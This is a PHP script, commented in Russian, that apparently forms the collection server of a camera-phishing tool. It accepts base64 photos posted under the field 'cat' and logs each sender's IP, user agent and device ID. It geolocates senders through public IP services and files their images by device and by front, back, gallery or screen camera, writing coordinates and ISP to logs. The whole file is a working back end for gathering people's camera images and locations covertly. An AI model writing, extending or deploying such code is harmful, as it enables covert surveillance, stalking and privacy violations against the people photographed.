<?php

// Универсальная функция для получения IP адреса
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Получение User-Agent для идентификации устройства
function getUserAgent() {
    return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
}

function sanitizePathSegment($value, $fallback) {
    $value = is_string($value) ? trim($value) : '';
    $value = preg_replace('/[^a-zA-Z0-9_-]/', '_', $value);
    $value = trim($value, '_-');
    if ($value === '') {
        return $fallback;
    }
    return substr($value, 0, 80);
}

function sanitizeCameraType($value) {
    $allowed = array('front', 'back', 'gallery', 'screen');
    return in_array($value, $allowed, true) ? $value : 'front';
}

// Функция для получения геолокации по IP адресу
function getGeoLocation($ip) {
    // Пропускаем локальные IP адреса
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return array(
            'country' => 'Local',
            'city' => 'Local',
            'region' => 'Local',
            'lat' => '0',
            'lon' => '0',
            'isp' => 'Local Network'
        );
    }
    
    // Используем ip-api.com (бесплатный, до 45 запросов в минуту)
    $url = "http://ip-api.com/json/$ip?fields=status,message,country,regionName,city,lat,lon,isp,timezone";
    $response = @file_get_contents($url);
    
    if ($response === false) {
        // Если не получилось, пробуем другой сервис
        $url2 = "https://ipapi.co/$ip/json/";
        $response = @file_get_contents($url2);
        if ($response !== false) {
            $data = json_decode($response, true);
            if (isset($data['error']) === false) {
                return array(
                    'country' => $data['country_name'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'lat' => $data['latitude'] ?? '0',
                    'lon' => $data['longitude'] ?? '0',
                    'isp' => $data['org'] ?? 'Unknown'
                );
            }
        }
        return array(
            'country' => 'Unknown',
            'city' => 'Unknown',
            'region' => 'Unknown',
            'lat' => '0',
            'lon' => '0',
            'isp' => 'Unknown'
        );
    }
    
    $data = json_decode($response, true);
    if (isset($data['status']) && $data['status'] === 'success') {
        return array(
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['regionName'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '0',
            'lon' => $data['lon'] ?? '0',
            'isp' => $data['isp'] ?? 'Unknown',
            'timezone' => $data['timezone'] ?? 'Unknown'
        );
    }
    
    return array(
        'country' => 'Unknown',
        'city' => 'Unknown',
        'region' => 'Unknown',
        'lat' => '0',
        'lon' => '0',
        'isp' => 'Unknown'
    );
}

$date = date('dMYHis');
$imageData = $_POST['cat'];

// Получаем IP или идентификатор устройства (ДО логирования)
$clientIP = getClientIP();
$userAgent = getUserAgent();

// Получаем геолокацию
$geo = getGeoLocation($clientIP);

// Определяем тип камеры (front или back)
$cameraType = sanitizeCameraType(isset($_POST['camera_type']) ? $_POST['camera_type'] : 'front');

// Создаем уникальный идентификатор (IP или телефон)
// Если есть параметр device_id в POST, используем его, иначе используем IP
$defaultDeviceId = preg_replace('/[^a-zA-Z0-9_-]/', '_', $clientIP);
$deviceId = sanitizePathSegment(isset($_POST['device_id']) ? $_POST['device_id'] : '', $defaultDeviceId);

if (!empty($_POST['cat'])) {
    // Логируем получение фотографии
    error_log("Received" . "\r\n", 3, "Log.log");
    // Логируем в файл активности с временной меткой и геолокацией
    $log_entry = "[" . date('Y-m-d H:i:s') . "] Photo received from IP: $clientIP | Device: $deviceId | Camera: $cameraType | Location: {$geo['country']}, {$geo['city']} | Coordinates: {$geo['lat']}, {$geo['lon']}\n";
    file_put_contents('activity.log', $log_entry, FILE_APPEND);
    // Логируем в отдельный файл для фото
    $photo_log_entry = "[" . date('Y-m-d H:i:s') . "] 📸 ФОТО | IP: $clientIP | Устройство: $deviceId | Камера: $cameraType | Страна: {$geo['country']} | Город: {$geo['city']} | Координаты: {$geo['lat']}, {$geo['lon']}\n";
    file_put_contents('logs_photos.log', $photo_log_entry, FILE_APPEND);
}

// Путь к папке Photo с подпапкой для устройства
// Можно изменить базовую папку здесь, если нужно (по умолчанию: 'Photo')
$basePhotoDir = __DIR__ . '/Photo';  // Можно изменить на другую папку при необходимости
$photoDir = $basePhotoDir . '/' . $deviceId . '/';

// Создаем директорию, если она не существует
if (!file_exists($photoDir)) {
    mkdir($photoDir, 0777, true);
}

// Создаем подпапку для типа камеры (front/back/gallery)
$cameraDir = $photoDir . $cameraType . '/';
if (!file_exists($cameraDir)) {
    mkdir($cameraDir, 0777, true);
}

// Сохраняем информацию о геолокации в файл
$geoFile = $photoDir . 'geo_info.txt';
$geoInfo = "IP: $clientIP\n";
$geoInfo .= "Country: {$geo['country']}\n";
$geoInfo .= "Region: {$geo['region']}\n";
$geoInfo .= "City: {$geo['city']}\n";
$geoInfo .= "Latitude: {$geo['lat']}\n";
$geoInfo .= "Longitude: {$geo['lon']}\n";
$geoInfo .= "ISP: {$geo['isp']}\n";
if (isset($geo['timezone'])) {
    $geoInfo .= "Timezone: {$geo['timezone']}\n";
}
$geoInfo .= "User-Agent: $userAgent\n";
$geoInfo .= "Last Update: " . date('Y-m-d H:i:s') . "\n";
file_put_contents($geoFile, $geoInfo);

// Декодируем изображение
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);

// Сохраняем файл с временной меткой и типом камеры
$filename = $cameraDir . 'cam_' . $cameraType . '_' . $date . '_' . time() . '.png';
$fp = fopen($filename, 'wb');

if ($fp) {
    fwrite($fp, $unencodedData);
    fclose($fp);
}

exit();
?>

